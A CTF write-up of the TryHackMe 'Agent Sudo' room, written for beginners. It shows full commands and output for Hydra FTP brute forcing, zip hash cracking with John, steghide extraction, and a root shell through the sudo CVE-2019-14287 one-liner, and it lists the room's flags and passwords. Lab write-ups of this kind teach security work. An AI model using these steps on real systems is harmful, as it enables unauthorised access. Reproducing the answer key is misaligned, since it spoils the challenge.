# TryHackMe CTF

> This write-up has been reformatted using AI from my orginial notes for clarity and better viewing

## Machine Information

| Field            | Details    |
| ---------------- | ---------- |
| **Machine Name** | Agent Sudo |
| **Date**         | 2/20/2026  |
| **Completed**    | 2/20/2026  |
| **Attacker OS**  | Kali Linux |
| **Difficulty**   | Easy       |

---

## Room Questions

### Task 2: Enumerate

| Question                                    | Answer       |
| ------------------------------------------- | ------------ |
| How many open ports?                        | `3`          |
| How you redirect yourself to a secret page? | `User-Agent` |
| What is the agent name?                     | `Chris`      |

### Task 3: Hash-Cracking and Brute-Force

| Question                              | Answer         |
| ------------------------------------- | -------------- |
| FTP Password?                         | `crystal`      |
| Zip File Password?                    | `alien`        |
| Steg Password?                        | `Area51`       |
| Who is the other agent(in full name)? | `james`        |
| SSH Password?                         | `hackerrules!` |

### Task 4: Capture the user flag

| Question                                  | Answer                             |
| ----------------------------------------- | ---------------------------------- |
| What is the user flag?                    | `b03d975e8c92a7c04146cfa7a5a313c7` |
| What is the incident of the photo called? | `Rosewell Alien Autospy`           |

### Task 5: Privilege Escalation

| Question                                  | Answer                             |
| ----------------------------------------- | ---------------------------------- |
| What is the CVE number for the escalation | `CVE-2019-14287`                   |
| What is the root flag?                    | `b53a02f55b57d4439e3341834d70c062` |
| Who is agent R?                           | `DesKel`                           |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -vv 10.67.128.13
```

### Nmap Output

```bash
nmap scan report for 10.67.128.13
Host is up, received reset ttl 62 (0.036s latency).
Scanned at 2026-02-20 14:30:57 EST for 70s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.14 seconds
Raw packets sent: 65607 (2.887MB) | Rcvd: 65536 (2.621MB)
```

### Scan Summary

**Scan Date:** 2026-02-20 at 14:30:57 EST | **Duration:** 70 seconds | **Host Status:** Up (latency: 0.036s, TTL: 62)

#### Open Ports

| Port   | State | Service | Version                         |
| ------ | ----- | ------- | ------------------------------- |
| 21/tcp | Open  | FTP     | vsftpd 3.0.3                    |
| 22/tcp | Open  | SSH     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | Open  | HTTP    | Apache httpd 2.4.29 (Ubuntu)    |

> 65,532 closed TCP ports not shown (all returned reset)

#### Port 21 — FTP

**Service:** vsftpd 3.0.3

#### Port 22 — SSH

**Service:** OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| Key Type | Bits | Fingerprint                                       |
| -------- | ---- | ------------------------------------------------- |
| RSA      | 2048 | `ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07` |
| ECDSA    | 256  | `5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea` |
| ED25519  | 256  | `2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2` |

#### Port 80 — HTTP

**Service:** Apache httpd 2.4.29 (Ubuntu) | **Page Title:** Annoucement | **Server Header:** `Apache/2.4.29 (Ubuntu)`

Supported Methods: `GET` `HEAD` `POST` `OPTIONS`

Let's take a look at the main page.

![index](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/agentsudo1.png)

**Notes:**

- Port 80 is running a page titled **Annoucement**
- FTP (port 21) is open and may allow anonymous login — worth checking early.
- SSH is available but will likely require credentials or a key found elsewhere on the box.

### FTP Perusing

Let's take a look at the FTP port and see what we can find.

```bash
saintmichael@archangelkali~ >ftp 10.67.128.13
Connected to 10.67.128.13.
220 (vsFTPd 3.0.3)
Name (10.67.128.13:saintmichael): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp>
```

Looks like we will have to come back to FTP at another point.

### Web Enumeration

```bash
gobuster dir -u http://10.67.128.13/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50
```

### Gobuster Output

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.128.13/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 218]
server-status        (Status: 403) [Size: 277]
Progress: 119996 / 119996 (100.00%)
===============================================================
Finished
===============================================================
```

### Directory Analysis

- **`/index.php`** — Main page

```html
<!DocType html>
<html>
  <head>
    <title>Annoucement</title>
  </head>

  <body>
    <p>
      Dear agents,
      <br /><br />
      Use your own <b>codename</b> as user-agent to access the site.
      <br /><br />
      From,<br />
      Agent R
    </p>
  </body>
</html>
```

### Time for a little curling?

We can modify the user-agent header using `curl "target" -H "User-Agent:" -L`

| Flag               | Description                                                                                          |
| ------------------ | ---------------------------------------------------------------------------------------------------- |
| `curl "target"`    | Makes a GET request to the target URL, replace `target` with the actual IP/URL                       |
| `-H "User-Agent:"` | The `-H` flag lets you set a custom header. Put your codename after the colon like `"User-Agent: C"` |
| `-L`               | Tells curl to follow redirects.                                                                      |

Based on the index page we know about `Agent R`, so we'll start from A and work through the alphabet.

Thankfully that didn't take very long:

```bash
curl http://10.67.128.13 -H "User-Agent: C" -L
```

```plaintext
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!

From,
Agent R
```

### What we've learned so far

| Agent   | Identity | Notes                                            |
| ------- | -------- | ------------------------------------------------ |
| Agent R | Unknown  | Authored both messages, seems to be in charge    |
| Agent C | Chris    | Has a **weak password** — worth brute forcing!   |
| Agent J | Unknown  | Needs to be contacted by Chris about "the stuff" |

### Why did changing the User-Agent work?

The web server was configured to serve **different content based on who is asking**.

Normally when your browser visits a site, it sends a `User-Agent` header that identifies itself — for example:

```HTML
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

In this case the server was programmed with logic that says essentially:

> "If the User-Agent is `C`, show the secret agent page — otherwise show the public announcement"

This is **server-side conditional content** — the backend checks the incoming header value and decides what to return based on it. It's similar in concept to how some sites serve different pages to mobile vs desktop browsers by checking the User-Agent.

In a real world scenario this could be used to:

- Hide admin panels from regular users
- Serve different content to specific API clients
- Restrict access to internal tools

In this CTF it was a simple **access control mechanism** — knowing the codename (`C`) was the "password" to unlock the hidden message from Agent R.

---

## 2. Brute-forcing

Time to brute force FTP!

So we know the user `chris` has a weak password. Let's use Hydra to brute force FTP:

```bash
hydra -l chris -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ftp://10.67.128.13
```

```plaintext
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-20 16:47:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking ftp://10.67.128.13:21/
[21][ftp] host: 10.67.128.13   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-20 16:48:06
```

## Hydra Flags: `-l` `-L` `-p` `-P`

| Flag | Type              | Description                                                                        |
| ---- | ----------------- | ---------------------------------------------------------------------------------- |
| `-l` | Single username   | Use when you already know the username. `-l chris` tells Hydra to only try `chris` |
| `-L` | Username wordlist | Use when you don't know the username and want to try multiple at once              |
| `-p` | Single password   | Use when you already know or suspect a specific password                           |
| `-P` | Password wordlist | Tries each password in the list one by one — used for brute forcing                |

> **Easy way to remember:** lowercase = single value, uppercase = wordlist

We were able to get `chris`'s password which is `crystal`. Let's take a look through the FTP server:

```bash
Connected to 10.67.128.13.
220 (vsFTPd 3.0.3)
Name (10.67.128.13:saintmichael): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32451|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> lcd ~/THM/CTF/easy/agentsudo
Local directory now: /home/saintmichael/THM/CTF/easy/agentsudo
ftp> mget *
```

Using `lcd` allows me to change the local download directory to my Kali machine and `mget *` allows me to grab all of the files at once.

Let's take a look at what we got:

```plaintext
$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

We also got the following pictures:

![cutie](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/as-cutie.png)

![cute-alien](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/as-cute-alien.jpg)

Based on the message from Agent C, there is something hidden inside the pictures — so we can use `binwalk` to investigate.

---

## What is Binwalk?

Binwalk is a tool designed to **analyze and extract hidden/embedded files** inside other files — very commonly used in CTF steganography challenges.

### How it works

It looks through the raw bytes of a file searching for known **file signatures** (also called magic bytes). For example:

- Every ZIP file starts with `PK`
- Every PNG starts with `\x89PNG`
- Every JPEG starts with `\xFF\xD8`

When it finds these signatures inside another file it reports them and can extract them.

### Key Flags

| Flag                  | Description                      |
| --------------------- | -------------------------------- |
| `binwalk file.png`    | Scan for embedded files          |
| `binwalk -e file.png` | Scan AND extract embedded files  |
| `binwalk -M file.png` | Recursively extract nested files |

Running binwalk on both images:

```bash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >binwalk as-cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

saintmichael@archangelkali~/THM/CTF/easy/agentsudo >binwalk as-cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

`as-cutie.png` has an embedded zip file containing `To_agentR.txt`. The JPEG appears clean. Let's extract from the PNG:

```bash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >binwalk -e as-cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

Despite the warning, the extraction folder was still created:

```bash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >ls
as-cute-alien.jpg  as-cutie.png  _as-cutie.png.extracted  To_agentJ.txt
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >cd _as-cutie.png.extracted
saintmichael@archangelkali~/THM/CTF/easy/agentsudo/_as-cutie.png.extracted >ls
365  365.zlib  8702.zip
```

let's try to extract it with `7zip`:

```bash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo/_as-cutie.png.extracted >7z x 8702.zip

Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
```

This is where **John the Ripper** comes in.

---

## What is zip2john?

`zip2john` is a utility that comes bundled with **John the Ripper**. It converts a password protected zip file into a **hash format** that John can then brute force.

### Why do we need it?

John can't directly attack a zip file — it needs the password hash extracted first. `zip2john` does exactly that.

### Usage

```bash
# Step 1 - extract the hash from the zip
zip2john 8702.zip > zip.hash

# Step 2 - crack the hash with John
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### What each part does

| Command             | Description                             |
| ------------------- | --------------------------------------- |
| `zip2john 8702.zip` | Extracts the password hash from the zip |
| `> zip.hash`        | Saves the hash to a file                |
| `john zip.hash`     | Passes the hash to John to crack        |
| `--wordlist=`       | Tells John which wordlist to use        |

> Think of it as a **two step process** — extract the hash first, then crack it.

```bash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo/_as-cutie.png.extracted >zip2john 8702.zip > zip.hash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo/_as-cutie.png.extracted >john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2026-02-20 19:16) 5.882g/s 192752p/s 192752c/s 192752C/s christal..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password for the zip file is `alien`

After extracting `8702.zip`, we have recovered the following file:

`To_agentR.txt`

```plaintext
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

I'm not sure what `QXJlYTUx` is so we can use cyberchef to figure it out!

[CyberChef](https://gchq.github.io/CyberChef/)

![base64](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/agentsudo3.png)

`QXJlYTUx` decodes to `Area51` which is our STEG password.

After attempting to use `Strings` and `Exiftool` on `cute-alien.jpg` I am not finding much.

There appears to be another tool that is possible that can assist. With knowing that the "steg" password is `Area51`

## What is Steghide?

**Steghide** is a steganography tool that can **hide and extract data inside image and audio files**. It supports JPEG, BMP, WAV and AU files.

### Key Flags

| Flag      | Description                                          |
| --------- | ---------------------------------------------------- |
| `extract` | Extract hidden data from a file                      |
| `-sf`     | Specifies the stego file (the image to extract from) |
| `-p`      | Passphrase to decrypt the hidden data                |

### Usage

```bash
# Extract with a known passphrase
steghide extract -sf image.jpg -p password

# Extract and be prompted for passphrase
steghide extract -sf image.jpg
```

> **Note:** Steghide requires a passphrase to extract — if you don't have one you can brute force it using `stegseek` with a wordlist.

```bash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >steghide extract -sf as-cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >ls
as-cute-alien.jpg  as-cutie.png  _as-cutie.png.extracted  message.txt  To_agentJ.txt  zip.hash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Now we have another name and password:

Username: `james`
Password: `hackerrules!`

## 3. SSH

Now that we have a username and password, we can attempt to sign into SSH:

```bash
saintmichael@archangelkali~/THM/CTF/easy/agentsudo >ssh james@10.64.130.221
The authenticity of host '10.64.130.221 (10.64.130.221)' can't be established.
ED25519 key fingerprint is: SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.64.130.221' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.64.130.221's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 21 01:05:54 UTC 2026

  System load:  0.0               Processes:           96
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for ens5: 10.64.130.221
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$
```

Now we need to find the user flag

```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$
```

There is another file on the box that we need to examine!

```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
```

![alien](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/as-Alien_autospy.jpg)

A reverse google search of this image revealed that this was the `Rosewell Alien Autospy`

## 3. Privilege escalation

The most common tool that is used to check for priv escalation is `LinPEAS`

[LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

#On your attackbox
scp linpeas.sh james@10.64.130.221:~/
```

Now we have linpeas on our SSH machine!

```bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  linpeas.sh  user_flag.txt
james@agent-sudo:~$
```

Linpeas didn't really give anything of value but we can run sudo

so checking sudo permissions gives us

```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

After some searching based on the next task this is a known vuln!

[CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

```bash
EXPLOIT:

sudo -u#-1 /bin/bash
```

Let's give it a try?

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
```

WE ARE ROOT!

```bash
root@agent-sudo:~# ls /root
root.txt
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root#
```

---

> **New to CTFs?** This section breaks down the core concepts used in this room so you can understand _why_ each step worked — not just _what_ was done.

---

## Key Takeaways for Beginners

### 1. Enumeration is everything

Before doing anything else, always scan with `nmap`. Knowing what ports are open tells you your attack surface. In this box, FTP, SSH, and HTTP each played a role in the full compromise. Never skip recon.

### 2. Always read the page source

The index page gave away the entire next step — the User-Agent clue was sitting right in the HTML. Get into the habit of running `curl` or viewing source on every page you find.

### 3. HTTP headers can be used as access control

Web servers can serve completely different content based on request headers like `User-Agent`. This is a real technique used to hide admin panels or restrict API access. Tools like Burp Suite and curl make it easy to manipulate these headers.

### 4. Lowercase vs uppercase flags matter

Many tools like Hydra use lowercase flags for single values (`-l`, `-p`) and uppercase for wordlists (`-L`, `-P`). Getting this wrong means your attack won't work — always double check the flag case.

### 5. Images can hide data (Steganography)

Files are not always what they appear to be. Tools like `binwalk`, `steghide`, and `strings` can reveal hidden data inside images. In CTFs, always run these on any image files you find.

### 6. Encoded strings are not encrypted strings

`QXJlYTUx` looked like gibberish but was just Base64 encoded text. Always throw unknown strings into CyberChef — it can identify and decode most common encoding schemes automatically.

### 7. `sudo -l` should always be one of your first commands

After getting a shell, always check sudo permissions immediately. A misconfigured sudo entry like `(ALL, !root)` was the entire privilege escalation path here — no fancy tools needed.

### 8. Weak passwords are a real threat

`chris` had the password `crystal` and it was cracked in under a minute using a common password list. This is why password hygiene matters — if a CTF can crack it in seconds, so can real attackers.

### 9. CVEs are your friend

Once you identify software versions, search for known CVEs. The sudo version on this box had **CVE-2019-14287** which gave an instant root shell. Always note version numbers during enumeration and look them up.

### 10. Follow the breadcrumbs

This box was a chain — each step gave you the info needed for the next. Web → FTP credentials → Steganography → SSH credentials → Privilege escalation. CTFs rarely require you to jump ahead, trust the process and follow what the clues are telling you.

---

> This write-up was created by `saintmichael`
